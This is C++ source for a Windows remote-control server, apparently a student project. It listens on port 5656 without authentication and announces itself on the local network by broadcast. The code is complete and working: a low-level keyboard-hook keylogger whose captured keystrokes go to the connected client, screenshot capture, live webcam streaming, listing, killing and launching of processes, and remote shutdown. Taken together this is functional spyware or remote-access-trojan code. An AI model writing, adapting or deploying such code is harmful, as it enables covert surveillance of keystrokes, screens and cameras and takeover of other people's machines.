#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <cstring>
#include <tlhelp32.h>
#include <gdiplus.h>
#include <vfw.h>
#include <tchar.h>
#include <psapi.h> 
#include <shellapi.h>
#include <shlobj.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;
using namespace Gdiplus;


SOCKET serverSocket;
SOCKET clientSocket;
atomic<bool> isKeylogActive(false);
atomic<bool> isRecording(false);
string keylogPath = "fileKeyLog.txt";
HHOOK keyboardHook = NULL;
HWND hCapture = NULL;


void receiveSignal(string& s);
void shutdown();
void keylog();
void takepic();
void processManagement();
void applicationManagement();
void webcam();
void hookKey();
void unhookKey();
void printkeys();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void startKeyLogger();
void stopKeyLogger();

static string toUtf8(const TCHAR* tstr) {
#ifdef UNICODE
    int size = WideCharToMultiByte(CP_UTF8, 0, tstr, -1, nullptr, 0, nullptr, nullptr);
    if (size <= 0) return string();
    vector<char> buffer(static_cast<size_t>(size));
    WideCharToMultiByte(CP_UTF8, 0, tstr, -1, buffer.data(), size, nullptr, nullptr);
    return string(buffer.data());
#else
    return string(tstr);
#endif
}

void sendLine(const string& s) {
    string msg = s + "\n";
    send(clientSocket, msg.c_str(), msg.length(), 0);
}

string receiveLine() {
    string result;
    char c;
    while (recv(clientSocket, &c, 1, 0) > 0) {
        if (c == '\n') break;
        if (c != '\r') result += c;
    }
    return result;
}

void receiveSignal(string& s) {
    try {
        s = receiveLine();
    } catch (...) {
        s = "QUIT";
    }
}
static std::atomic<bool> keepBroadcast(true);
std::string GetRealLocalIP() {
    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s == INVALID_SOCKET) return "";
    sockaddr_in remote;
    remote.sin_family = AF_INET;
    remote.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &remote.sin_addr);
    if (connect(s, (sockaddr*)&remote, sizeof(remote)) == SOCKET_ERROR) {
        closesocket(s);
        return "";
    }
    sockaddr_in name;
    int namelen = sizeof(name);
    if (getsockname(s, (sockaddr*)&name, &namelen) == SOCKET_ERROR) {
        closesocket(s);
        return "";
    }
    char buf[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &name.sin_addr, buf, INET_ADDRSTRLEN);
    closesocket(s);
    return std::string(buf);
}

void BroadcastServerInfo() {
    std::string realIP = GetRealLocalIP();
    if (realIP.empty()) return;
    SOCKET bcast = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (bcast == INVALID_SOCKET) return;

    char opt = 1;
    setsockopt(bcast, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));

    sockaddr_in src = {};
    src.sin_family = AF_INET;
    src.sin_port = 0;
    inet_pton(AF_INET, realIP.c_str(), &src.sin_addr);
    bind(bcast, (sockaddr*)&src, sizeof(src));

    sockaddr_in dest = {};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(5656);  
    dest.sin_addr.s_addr = INADDR_BROADCAST;

    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    std::string message = "IP:" + realIP + "|Name:" + std::string(hostname);

    std::cout << "Broadcasting server info: " << message << std::endl;

    while (keepBroadcast) {
        sendto(bcast, message.c_str(), (int)message.length(), 0, (sockaddr*)&dest, sizeof(dest));
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    closesocket(bcast);
}

void shutdown() {
    system("shutdown /s /t 0");
}

void restart() {
    system("shutdown /r /t 0");
}

// Keylogger Implementation
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN && isKeylogActive) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboard->vkCode;
        
        ofstream file(keylogPath, ios::app);
        if (file.is_open()) {
            bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            
            switch (vkCode) {
                case VK_SPACE: file << " "; break;
                case VK_RETURN: file << "Enter\n"; break;
                case VK_BACK: file << "Backspace"; break;
                case VK_TAB: file << "Tab"; break;
                case '0': file << (shift ? ")" : "0"); break;
                case '1': file << (shift ? "!" : "1"); break;
                case '2': file << (shift ? "@" : "2"); break;
                case '3': file << (shift ? "#" : "3"); break;
                case '4': file << (shift ? "$" : "4"); break;
                case '5': file << (shift ? "%" : "5"); break;
                case '6': file << (shift ? "^" : "6"); break;
                case '7': file << (shift ? "&" : "7"); break;
                case '8': file << (shift ? "*" : "8"); break;
                case '9': file << (shift ? "(" : "9"); break;
                case VK_OEM_2: file << (shift ? "?" : "/"); break;
                case VK_OEM_4: file << (shift ? "{" : "["); break;
                case VK_OEM_6: file << (shift ? "}" : "]"); break;
                case VK_OEM_1: file << (shift ? ":" : ";"); break;
                case VK_OEM_7: file << (shift ? "\"" : "'"); break;
                case VK_OEM_COMMA: file << (shift ? "<" : ","); break;
                case VK_OEM_PERIOD: file << (shift ? ">" : "."); break;
                case VK_OEM_MINUS: file << (shift ? "_" : "-"); break;
                case VK_OEM_PLUS: file << (shift ? "+" : "="); break;
                case VK_OEM_3: file << (shift ? "~" : "`"); break;
                case VK_OEM_5: file << "|"; break;
                default:
                    if (vkCode >= 'A' && vkCode <= 'Z') {
                        char ch = vkCode;
                        if ((!shift && !caps) || (shift && caps)) {
                            ch = tolower(ch);
                        }
                        file << ch;
                    }
                    break;
            }
            file.close();
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void startKeyLogger() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (isKeylogActive && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void hookKey() {
    isKeylogActive = true;
    ofstream file(keylogPath, ios::trunc);
    file.close();
    
    thread keylogThread(startKeyLogger);
    keylogThread.detach();
}

void unhookKey() {
    isKeylogActive = false;
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
}

void printkeys() {
    ifstream file(keylogPath);
    string content;
    if (file.is_open()) {
        stringstream buffer;
        buffer << file.rdbuf();
        content = buffer.str();
        file.close();
        
        // Clear file
        ofstream clearFile(keylogPath, ios::trunc);
        clearFile.close();
    }
    
    if (content.empty()) {
        content = "\0";
    }
    send(clientSocket, content.c_str(), content.length(), 0);
}

void keylog() {
    string s;
    while (true) {
        receiveSignal(s);
        if (s == "PRINT") printkeys();
        else if (s == "HOOK") hookKey();
        else if (s == "UNHOOK") unhookKey();
        else if (s == "QUIT") return;
    }
}

// Screenshot Function
void takepic() {
    string ss;
    
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    while (true) {
        receiveSignal(ss);
        if (ss == "TAKE") {
            HDC hdcScreen = GetDC(NULL);
            HDC hdcMemory = CreateCompatibleDC(hdcScreen);
            
            int width = GetSystemMetrics(SM_CXSCREEN);
            int height = GetSystemMetrics(SM_CYSCREEN);
            
            HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
            SelectObject(hdcMemory, hBitmap);
            BitBlt(hdcMemory, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
            
            Bitmap* bitmap = new Bitmap(hBitmap, NULL);
            
            IStream* stream = NULL;
            CreateStreamOnHGlobal(NULL, TRUE, &stream);
            
            CLSID pngClsid;
            OLECHAR guidStr[] = L"{557CF406-1A04-11D3-9A73-0000F81EF32E}";
            CLSIDFromString(guidStr, &pngClsid);
            Status status = bitmap->Save(stream, &pngClsid, NULL);
            
            STATSTG statstg;
            stream->Stat(&statstg, STATFLAG_DEFAULT);
            ULONG size = statstg.cbSize.LowPart;
            
            char* buffer = new char[size];
            LARGE_INTEGER li = {0};
            stream->Seek(li, STREAM_SEEK_SET, NULL);
            stream->Read(buffer, size, NULL);
            
            sendLine(to_string(size));
            send(clientSocket, buffer, size, 0);
            
            delete[] buffer;
            delete bitmap;
            stream->Release();
            DeleteObject(hBitmap);
            DeleteDC(hdcMemory);
            ReleaseDC(NULL, hdcScreen);
            
        } else if (ss == "QUIT") {
            GdiplusShutdown(gdiplusToken);
            return;
        }
    }
}

string toLower(string s) {
    for (char &c : s) c = tolower(c);
    return s;
}

string FindShortcutRecursive(string folderPath, string targetName) {
    string searchPath = folderPath + "\\*";
    WIN32_FIND_DATAA data; 
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &data);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (string(data.cFileName) == "." || string(data.cFileName) == "..") continue;

            string fullPath = folderPath + "\\" + data.cFileName;

            if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                string found = FindShortcutRecursive(fullPath, targetName);
                if (!found.empty()) {
                    FindClose(hFind);
                    return found;
                }
            } else {
                string fileName = toLower(data.cFileName);
                if (fileName.find(".lnk") != string::npos && fileName.find(targetName) != string::npos) {
                    FindClose(hFind);
                    return fullPath;
                }
            }
        } while (FindNextFileA(hFind, &data)); 
        FindClose(hFind);
    }
    return "";
}

void processManagement() {
    string ss;
    
    while (true) {
        receiveSignal(ss);
        
        if (ss == "XEM") {
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe32;
                pe32.dwSize = sizeof(PROCESSENTRY32);
                
                vector<PROCESSENTRY32> processes;
                if (Process32First(hSnapshot, &pe32)) {
                    do {
                        processes.push_back(pe32);
                    } while (Process32Next(hSnapshot, &pe32));
                }
                CloseHandle(hSnapshot);
                
                sendLine(to_string(processes.size()));
                
                for (const auto& proc : processes) {
                    sendLine(toUtf8(proc.szExeFile));
                    sendLine(to_string(proc.th32ProcessID));
                    sendLine(to_string(proc.cntThreads));
                }
            }
        } else if (ss == "KILL") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "KILLID") {
                    string pidStr = receiveLine();
                    DWORD pid = stoul(pidStr);
                    
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hProcess != NULL) {
                        if (TerminateProcess(hProcess, 0)) {
                            sendLine("Process killed successfully");
                        } else {
                            sendLine("Error: Unable to kill the process");
                        }
                        CloseHandle(hProcess);
                    } else {
                        sendLine("Error: Process not found");
                    }
                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "START") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "STARTID") {
                    string exeName = receiveLine();

                    STARTUPINFOA si = {0};
                    PROCESS_INFORMATION pi = {0};
                    si.cb = sizeof(si);

                    char fullPath[MAX_PATH] = {0};
                    DWORD found = SearchPathA(NULL, exeName.c_str(), ".exe", MAX_PATH, fullPath, NULL);
                    if (found > 0 && found < MAX_PATH) {
                        string cmd = string("\"") + fullPath + "\"";
                        if (CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                            sendLine("Process started successfully");
                            CloseHandle(pi.hProcess);
                            CloseHandle(pi.hThread);
                        } else {
                            sendLine("Error: Unable to start the process");
                        }
                    } else {
                        HINSTANCE h = ShellExecuteA(NULL, "open", exeName.c_str(), NULL, NULL, SW_SHOWNORMAL);
                        if ((INT_PTR)h > 32) {
                            sendLine("Process started successfully");
                        } else {
                            sendLine("Error: Unable to start the process");
                        }
                    }
                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "QUIT") {
            return;
        }
    }
}

struct AppInfo {
    string title;
    string exeName;
    DWORD pid;
    DWORD threads;
};

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    vector<AppInfo>* pApps = (vector<AppInfo>*)lParam;
    if (IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0) {
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);
        if (pid == GetCurrentProcessId()) return TRUE;
        
        char title[1024];
        GetWindowTextA(hwnd, title, sizeof(title));
        
        string exeName = "Unknown";
        DWORD threads = 0;
        
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess) {
            char buffer[MAX_PATH];
            if (GetModuleBaseNameA(hProcess, NULL, buffer, MAX_PATH)) {
                exeName = buffer;
            }
            CloseHandle(hProcess);
        }
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (pe32.th32ProcessID == pid) {
                        threads = pe32.cntThreads;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }
        
        if (GetParent(hwnd) == NULL) {
            pApps->push_back({string(title), exeName, pid, threads});
        }
    }
    return TRUE;
}

string GetAppPathFromRegistry(string appName) {
    if (appName.find(".exe") == string::npos) appName += ".exe";
    
    const string subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + appName;
    char path[MAX_PATH] = { 0 };
    DWORD bufferSize = MAX_PATH;
    if (RegGetValueA(HKEY_CURRENT_USER, subKey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &bufferSize) == ERROR_SUCCESS) {
        return string(path);
    }
    bufferSize = MAX_PATH;
    if (RegGetValueA(HKEY_LOCAL_MACHINE, subKey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &bufferSize) == ERROR_SUCCESS) {
        return string(path);
    }
    return ""; 
}
string FindAppInStartMenu(string appName) {
    appName = toLower(appName);
    char path[MAX_PATH];
    string result = "";

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAMS, NULL, 0, path))) {
        result = FindShortcutRecursive(string(path), appName);
        if (!result.empty()) return result;
    }

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_COMMON_PROGRAMS, NULL, 0, path))) {
        result = FindShortcutRecursive(string(path), appName);
        if (!result.empty()) return result;
    }

    return "";
}

void applicationManagement() {
    string ss;
    
    while (true) {
        receiveSignal(ss);
        if (ss == "XEM") {
            vector<AppInfo> apps;
            EnumWindows(EnumWindowsProc, (LPARAM)&apps);
            
            sendLine(to_string(apps.size()));
            
            for (const auto& app : apps) {
                sendLine(app.title);       
                sendLine(app.exeName);     
                sendLine(to_string(app.pid));
                sendLine(to_string(app.threads));
            }
        
        } else if (ss == "KILL") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "KILLID") {
                    string pidStr = receiveLine();
                    DWORD pid = stoul(pidStr);
                    
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hProcess != NULL) {
                        if (TerminateProcess(hProcess, 0)) {
                            sendLine("Application closed successfully");
                        } else {
                            sendLine("Error: Unable to close the application");
                        }
                        CloseHandle(hProcess);
                    } else {
                        sendLine("Error: Application not found");
                    }
                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "START") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "STARTID") {
                    string inputName = receiveLine(); 
                    string pathExec = "";

                    pathExec = FindAppInStartMenu(inputName);

                    if (pathExec.empty()) {
                        char fullPath[MAX_PATH] = {0};
                        string tempName = inputName;
                        if (tempName.find(".exe") == string::npos) tempName += ".exe";

                        if (SearchPathA(NULL, tempName.c_str(), NULL, MAX_PATH, fullPath, NULL) > 0) {
                            pathExec = string(fullPath);
                        }
                    }

                    if (!pathExec.empty()) {
                        HINSTANCE h = ShellExecuteA(NULL, "open", pathExec.c_str(), NULL, NULL, SW_SHOWNORMAL);
                        if ((INT_PTR)h > 32) {
                            sendLine("Application opened at: " + pathExec);
                        } else {
                            sendLine("Error: Found but unable to open: " + pathExec);
                        }
                    } else {
                        HINSTANCE h = ShellExecuteA(NULL, "open", inputName.c_str(), NULL, NULL, SW_SHOWNORMAL);
                        if ((INT_PTR)h > 32) {
                             sendLine("Opened via Windows Run command");
                        } else {
                             sendLine("Error: Application not found with name '" + inputName + "'");
                        }
                    }

                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "QUIT") {
            return;
        }
    }
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

static LRESULT CALLBACK FrameCallback(HWND hWnd, LPVIDEOHDR lpVH) {
    if (clientSocket == INVALID_SOCKET) return 0;
    if (!isRecording) return 0;
    DWORD dataSize = lpVH->dwBytesUsed;
    if (dataSize < 1024) return 0;
    int magic = 0xFFFFFFFF; 
    send(clientSocket, (char*)&magic, sizeof(magic), 0);
    int iResult = send(clientSocket, (char*)&dataSize, sizeof(dataSize), 0);
    if (iResult == SOCKET_ERROR) {
        isRecording = false;
        return 0;
    }

    iResult = send(clientSocket, (char*)lpVH->lpData, dataSize, 0);
    if (iResult == SOCKET_ERROR) {
        isRecording = false;
    }

    return (LRESULT)TRUE;
}

void webcam() {
    string cmd;
    bool streaming = false;

    while (true) {
        receiveSignal(cmd);

        if (cmd == "START") {
            if (!streaming) {
                streaming = true;
                sendLine("OK");

                thread streamThread([&]() {
                    hCapture = capCreateCaptureWindowA("WebcamCap",
                                                       WS_POPUP, 0, 0, 640, 480,
                                                       NULL, 0);
                    if (!hCapture) {
                        streaming = false;
                        sendLine("STOPPED");
                        return;
                    }

                    if (!SendMessage(hCapture, WM_CAP_DRIVER_CONNECT, 0, 0)) {
                        DestroyWindow(hCapture);
                        hCapture = NULL;
                        streaming = false;
                        sendLine("STOPPED");
                        return;
                    }

                    BITMAPINFO bmpInfo = {0};
                    bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
                    bmpInfo.bmiHeader.biWidth = 640;
                    bmpInfo.bmiHeader.biHeight = 480;
                    bmpInfo.bmiHeader.biPlanes = 1;
                    bmpInfo.bmiHeader.biBitCount = 24;
                    bmpInfo.bmiHeader.biCompression = MAKEFOURCC('M', 'J', 'P', 'G');
                    bmpInfo.bmiHeader.biSizeImage = 640 * 480 * 3;
                    
                    if (!SendMessage(hCapture, WM_CAP_SET_VIDEOFORMAT, sizeof(BITMAPINFOHEADER), (LPARAM)&bmpInfo)) {}

                    char opt = 1;
                    setsockopt(clientSocket, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
                    int sendBuff = 1024 * 1024; 
                    setsockopt(clientSocket, SOL_SOCKET, SO_SNDBUF, (char*)&sendBuff, sizeof(sendBuff));

                    SendMessage(hCapture, WM_CAP_SET_CALLBACK_FRAME, 0, (LPARAM)FrameCallback);
                    SendMessage(hCapture, WM_CAP_SET_PREVIEWRATE, 1, 0);
                    SendMessage(hCapture, WM_CAP_SET_PREVIEW, TRUE, 0);

                    isRecording = true;

                    while (streaming && isRecording) {
                        SendMessage(hCapture, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
                    }

                    isRecording = false;
                    
                    if (hCapture) {
                        SendMessage(hCapture, WM_CAP_SET_CALLBACK_FRAME, 0, 0);
                        SendMessage(hCapture, WM_CAP_SET_PREVIEW, FALSE, 0);
                        SendMessage(hCapture, WM_CAP_DRIVER_DISCONNECT, 0, 0);
                        DestroyWindow(hCapture);
                        hCapture = NULL;
                    }
                });
                streamThread.detach();

            } else {
                sendLine("ERROR: Already streaming");
            }

        } else if (cmd == "STOP") {
            if (streaming) {
                streaming = false;
                isRecording = false;
            } else {
                sendLine("ERROR: Not streaming");
            }

        } else if (cmd == "QUIT") {
            return;
        }
    }
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed" << endl;
        return 1;
    }
    
    std::thread(BroadcastServerInfo).detach();

    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed" << endl;
        WSACleanup();
        return 1;
    }
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(5656);
    
    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "Bind failed" << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    
    if (listen(serverSocket, 100) == SOCKET_ERROR) {
        cerr << "Listen failed" << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    
    cout << "Server listening on port 5656..." << endl;
    
    clientSocket = accept(serverSocket, NULL, NULL);
    if (clientSocket == INVALID_SOCKET) {
        cerr << "Accept failed" << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    
    cout << "Client connected!" << endl;
    
    string s;
    while (true) {
        receiveSignal(s);
        
        if (s == "KEYLOG") {
            keylog();
        } else if (s == "SHUTDOWN") {
            shutdown();
        } else if (s == "TAKEPIC") {
            takepic();
        } else if (s == "PROCESS") {
            processManagement();
        } else if (s == "APPLICATION") {
            applicationManagement();
        } else if (s == "WEBCAM") {
            webcam();
        } else if (s == "QUIT") {
            break;
        }
    }
    
    keepBroadcast = false;
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();
    
    return 0;
}
